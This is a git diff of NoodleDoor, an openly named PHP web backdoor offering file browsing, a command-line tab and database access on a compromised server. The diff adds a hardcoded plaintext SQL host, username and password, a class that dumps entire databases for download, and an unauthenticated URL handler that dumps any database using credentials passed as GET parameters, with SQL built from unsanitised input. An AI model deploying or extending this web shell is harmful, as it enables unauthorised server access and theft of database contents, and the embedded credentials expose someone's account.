@@ -1,5 +1,10 @@
 <? 
 $pass = hash("sha256", "cake");
+$sqlinfo = [
+  "host" => "ftp.zekesonxx.com",
+  "username" => "qafbuevv_zbee",
+  "password" => "VO46kQSfLc7w"
+];
 
 /*
 NoodleDoor made by Zbee (Ethan Henderson) 2014 - https://github.com/zbee/noodledoor
@@ -14,8 +19,6 @@ Todo:
   - Search file system for password
     - Search for files named mysql
     - Search within files for mysql functions
-  - Log into database
-  - View databases
   - View tables
   - View rows
   - Edit rows
@@ -51,6 +54,8 @@ function relPath($a,$b=__FILE__){if($a == $b){return "./";}$b=is_dir($b)?rtrim($
 function _download($a,$b){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Length: '.getsize($a));header('Content-Disposition: attachment; filename='.basename($b));readfile(str_replace("/","",$a));}
 function dlDir($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->buildFromDirectory(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
 function dlFile($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->addFile(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
+Class DBBackup{private $a;private $b;private $c;private $d;private $f;private $g;private $h=array();private $j;private $k=array();private $l;private $m;public function DBBackup($n){if(!$n['host'])$this->error[]='Parameter host missing';if(!$n['user'])$this->error[]='Parameter user missing';if(!isset($n['password']))$this->error[]='Parameter password missing';if(!$n['database'])$this->error[]='Parameter database missing';if(!$n['driver'])$this->error[]='Parameter driver missing';if(count($this->error)>0){return;}$this->host=$n['host'];$this->driver=$n['driver'];$this->user=$n['user'];$this->password=$n['password'];$this->dbName=$n['database'];$this->fileName=$this->dbName."-".time().".sql";$this->writeFile('CREATE DATABASE '.$this->dbName.";\n\n");if($this->host=='localhost'){$this->host='127.0.0.1';}$this->dsn=$this->driver.':host='.$this->host.';dbname='.$this->dbName;$this->connect();$this->getTables();$this->writeFile("-- THE END\n\n");_download($this->fileName, $this->fileName);unlink($this->fileName);}public function writeFile($p){file_put_contents($this->fileName,(is_file($this->fileName)==false?"":file_get_contents($this->fileName)).$p);}public function backup(){if(count($this->error)>0){return array('error'=>true,'msg'=>$this->error);}return array('error'=>false,'msg'=>$this->final);}private function generate($r){$this->final.='--CREATING TABLE '.$r['name']."\n";$this->final.=$r['create'].";\n\n";$this->final.='--INSERTING DATA INTO '.$r['name']."\n";$this->final.=$r['data']."\n\n\n";$this->writeFile($this->final);$this->final="";}private function connect(){try{$this->handler=new PDO($this->dsn,$this->user,$this->password);}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getTables(){try{$t=$this->handler->query('SHOW TABLES');$u=$t->fetchAll();$v=0;foreach($u as $w){$x['name']=$w[0];$x['create']=$this->getColumns($w[0]);$x['data']=$this->getData($w[0]);$this->generate($x);$v++;}unset($t);unset($u);unset($v);return true;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getColumns($y){try{$t=$this->handler->query('SHOW CREATE TABLE '.$y);$z=$t->fetchAll();$z[0][1]=preg_replace("/AUTO_INCREMENT=[\w]*./",'',$z[0][1]);return $z[0][1];}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getData($y){try{$t=$this->handler->query('SELECT * FROM '.$y);$z=$t->fetchAll(PDO::FETCH_NUM);$aa='';foreach($z as $bb){foreach($bb as&$cc){$cc=htmlentities(addslashes($cc));}$aa.='INSERT INTO '.$y.' VALUES (\''.implode('\',\'',$bb).'\');'."\n";}return $aa;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}}
+function dlDB($h,$u,$p,$d){$b=new DBBackup(array('host'=>$h,'driver'=>'mysql','user'=>$u,'password'=>$p,'database'=>$d));}
 
 if (isset($_GET["dl"])) {
   if (is_file($_GET["dl"])) {
@@ -58,6 +63,11 @@ if (isset($_GET["dl"])) {
   } elseif (is_dir($_GET["dl"])) {
     dlDir($_GET["dl"]);
   }
+  exit;
+}
+
+if (isset($_GET["d"]) && isset($_GET["h"]) && isset($_GET["u"]) && isset($_GET["p"])) {
+  dlDB($_GET["h"],$_GET["u"],$_GET["p"],$_GET["d"]);
   exit;
 }
 
@@ -73,7 +83,61 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
   if (isset($_GET["c"])) {
 	  $bod .= "";
   } elseif (isset($_GET["d"])) {
-	  
+    if (isset($_POST["d-p"])) {
+      try {
+        $db = new PDO("mysql:host=".$_POST["d-h"].";charset=utf8", $_POST["d-u"], $_POST["d-p"]);
+      } catch (PDOException $e) {
+        $err = "<div class='alert alert-danger'>ERROR: " . $e->getMessage() . "</div>";
+      }
+    } else {
+      $db = null;
+      $err = "";
+    }
+    
+    if ($db == null) {
+      $bod .= "
+      <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
+        <form class='form' role='form' method='post'>
+          ".$err."
+          <input type='hidden' name='p' value='$pass'>
+          <input type='hidden' name='action' value='login'>
+          <input type='hidden' name='target' value='databases'>
+          <div class='form-group'>
+            <label for='u'>SQL Host</label>
+            <input type='text' class='form-control' id='u' name='d-h' placeholder='Host' value='".$sqlinfo["host"]."'>
+          </div>
+          <div class='form-group'>
+            <label for='u'>SQL Username</label>
+            <input type='text' class='form-control' id='u' name='d-u' placeholder='Username' value='".$sqlinfo["username"]."'>
+          </div>
+          <div class='form-group'>
+            <label for='p'>SQL Password</label>
+            <input type='password' class='form-control' id='p' name='d-p' placeholder='Password' value='".$sqlinfo["password"]."'>
+          </div>
+          <button type='submit' class='btn btn-default btn-block'>Sign in</button>
+        </form>
+      </div>";
+    } elseif (is_object($db) && $err == null && $_POST["target"] == "databases") {
+      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Database</th><th>Collation</th><th>Tables</th><th></th></tr>";
+      $stmt = $db->query("show databases");
+      foreach($stmt as $row) {
+        $rows = 0;
+        $rowsq = $db->query("select count(*) from `information_schema`.tables where table_schema='".$row["Database"]."'");
+        foreach($rowsq as $r) {
+          $rows = intval($r[0]);
+        }
+        $col = "";
+        $colq = $db->query("SELECT CCSA.character_set_name FROM information_schema.`TABLES` T,
+          information_schema.`COLLATION_CHARACTER_SET_APPLICABILITY` CCSA
+          WHERE CCSA.collation_name = T.table_collation
+          AND T.table_schema = '".$row["Database"]."'");
+        foreach($colq as $c) {
+          $col = $c[0];
+        }
+        $dl = "<a href='?d=".$row["Database"]."&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
+        $bod .= "<tr><td><a class='a' target='table' dir='".$row["Database"]."'><i class='glyphicon glyphicon-list-alt'></i> ".$row["Database"]."</a></td><td>".$col."</td><td>$rows</td><td>$dl</td></tr>";
+      }
+    }
   } else {
 	  $bod .= hpath();
 	  $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
@@ -138,7 +202,7 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
           $stats["owner"] = "";
           $stats["size"] = $file != ".." ? hsize($path . $file) : "";
           $chsums = "";
-          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i> Delete</a>";
+          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
           $isdir = true;
         } elseif (is_file($path . $file)) {
           $stats = stat($path . $file);
@@ -153,13 +217,13 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
             $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
             $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
           }
-          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i> Checksums</button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
-          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i> Delete</a>";
+          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i></button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
+          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
           $isdir = false;
         }
         $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
         $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
-        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i> Download</a>";
+        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
         $echo = "<tr>
           <td>$stats[name]</td>
           <td>$stats[size]</td>
@@ -250,11 +314,11 @@ file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
           </button>
-          <a class="navbar-brand" href="<?=$nof?>?">NoodleDoor</a>
+          <a class="navbar-brand" href="<?=$nof?>">NoodleDoor</a>
         </div>
         <div id="navbar" class="collapse navbar-collapse">
           <ul class="nav navbar-nav">
-            <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?">File System</a></li>
+            <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>">File System</a></li>
             <li <? if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
             <li <? if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
           </ul>
@@ -283,32 +347,3 @@ file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
     </script>
   </body>
 </html>
-<!--ae21d1a11fa6eba09400507a878b8f984000812cab6de0e92c1b69612ac03889d1d0c9e0b4a8fd83c9e2d22f9aa28e40df12e00af02c7bc982351e54aa72aabc-->
-<!--29c58c51486f4c6bb6739cc3cb6cceea3ed690a99ba6b68bd7a3cd25a0b317a94321e9eb097b34186265f62084bca4d076ffb0da9790f1ddca2513215b17b6b4-->
-<!--f78477d67cbed652ad40bd8c4d2c5eb2bf301eeb8a6bb9237b033603159f9a77887e6698e35d849d2c35a6e0a46fbd745249dac07e49a791d6794f809ee7a7cf-->
-<!--bf7aa71fd746580a56c622b17142b0904ecda5400c8f954d7d58aca8ab733315e1516a674282f41cd461cc6b757bf186eb0c7d21bb4ac9df2a740d8e5d1a1ad0-->
-<!--214a63239cf5017837dde03dec7c379c51441b40654fddef57447b685b2635264faf10ae550b278dd70f01c0000a3b206092f00609495729a427f68361f5f6b3-->
-<!--d43f3f2651f3d74acdd9aec7fbf9bbb19c3c550e9825ef3cad7f83292a57c27ce13750c0251c40e176564258400356aa160b542d06a6734caf23c4ccd52181a0-->
-<!--93c9787b2b48bebca0ac8761068f5119822cf1156bfa471b4d67e7b2221a51c2d1dd90fa664e7dc68fb436032c9e6eee062a6d67fd6b4b704003e2f7d67895d2-->
-<!--8f2d2ac1d2fbc019bc3cb31ac5f2872ff3522faeb4dbcda45bf90517c4a0bedef43e0fb58a746dc142e60789a5742b074e7612e8813dd8df4752f5200b182644-->
-<!--aa9c195c255ada871d4e34b65bac67a7c0eeae448ebc185cd69fb14d8aba89da80b3918bb5cd0b9e8d876a9b52a38a9d528be1007889bf13fc3991fbf2906138-->
-<!--525e1550addffe9107a2ce5709328b828f470402dec7f9b55699cecfd97d05bdf9ddad6d4ade5c7623a8ff01ced086c05be73be1da837bd6ef7825b112008c80-->
-<!--1e36d1fad1f69fa58cd395984cbee20c7e18cb7f4110ed2fc7209967a714a92ba25529315e6daa7294c34ecb3f4d80ff9e3f41f8e1838665e96db0d160539cfb-->
-<!--5be6cb058e7100c34d87d90118e88b51346b8a95b034f8266dffd43d42bce7093f51e80e4cfe067d9cf19df31d171c6e9b6435e6d580addce3a7ccf030b64453-->
-<!--c29c360203aceb6c7ebeb7426bb3853163f8c373b3781af5b9f5dd9358e733ab71cc23836208938d54f9e21dd8353a6261d5cb968fd192bc91f2c82f0354433c-->
-<!--6ef9fdc80643f9cde65e0e23d30ea9af6b0cda0b1724af220b8daf6432022d384139c46f6894e675a6b03864cbbe7116d984755d15564952c35c042e5da740a5-->
-<!--6fd2639a424dc0f6b72e3b098a25bd2d39786a63de0557860d1f26d1783cae32b866c63172e8f4aaaecea938ef3b958e39b3710cdfd5a789df07d239aa7f965d-->
-<!--f3dfd7ddde2ab8a2a77b8c7989f8534626a967fcadb25d187b1ffecdd9040c87abdfc6252f05464c2ac1eede688603012c2cc415b2db07bc44fc2c5d12a76963-->
-<!--fec214c9b22ef6ef5381a4b9d7c43a2cce3530bfc63120ab9844aee858637345a644ba5eedf87dcaf998f906a104beb69a38e18e934e734a5816c5b28f735fbf-->
-<!--ccc5d1a88f980fd9bb8e242b297c21fbd9ab0bcbd9ac99dc96cf1c057306c782364c48870411c8437a441237bc895ab66264d7dd16855c3e44aa9f98e96faab5-->
-<!--c726860adfe9a7613a8cc02ae21f60509eb3275c3a2e2cc288ace0fe47a2031a6183957cc70fd982e9e20256d3430b0e4243a2ace68ee4f071548e745c79ae58-->
-<!--e303fc23e364670537857592044d1d0f5318aaee0039e767f3efd080cc6ac956b4a133758e9a274779fdd0ddf7d3157db4793627ca48c7dcaea72e1098a3fe4b-->
-<!--5d49e2541781bd6aaf98a258506d6d3ac29e7749a2fecb2dd0b4093fb6ac808a6679ecca47ce622f3762fd821c72b786f671aafc1fbb6cc09ec2aad4281ed40b-->
-<!--43d9407bc608efbb56ad1050350aaec40de39bf408da539c14fbd4be687d6543101dca2b6f5a15beb27228ce91df684eb1017f45092b02e62ae429db9ece359f-->
-<!--35eba5a7bbbafa4125fa9639d8b511d69c4eb4caada8112e1491882f0c5fe0dc7d10d999a7c9f79e471d53c4dc7e63adb885f45b3c3a112395bc57d72d22f3f7-->
-<!--3751c4dee3a135c45a3e44e79c99c6150a2f5e13b0738f1e636fc153016f16a61102cef83c7448479ce34556ff918519c0f248165399f3aa90dee6817a567bab-->
-<!--85482f81de0edd3fd9907ad06655b385bc70eca6375788225da75e1acbdd129fd455904ad3a90f4749351ac3ea72eae105096b22986c8e58e05d19901f8d5897-->
-<!--78cfbbc0c251d59225ee57476028ff13264751fb3c08fbb6418e95ac82b4a95cf81e41394018163b70727744bfd77dadb43e99730bc8736a895ab071c30b113e-->
-<!--b246ffca6c84bc4f1bcfb6b03a7b07c69bdded9b144d34c07318e5e138ed522f618999c128f6282bddc9d4cf389cc9231fa2da1917d2b844b74712a5eb8ecc6b-->
-<!--6aa5040d65e9611b29f3f9a4cadee2781608fd0bd5e204a433af5bc1ef6f4898613156586ba6c5b04d5a3afa7b4d892497fee5ad20251a37b15ab830a154e226-->
-<!--022867b7cf61467c206b6ffeda9d116c2a1c4fcec932181470daa4a0d51e76cb169c69f8ae138b57e4668831955282b919c458ee90a1da34518937b494783c7f-->
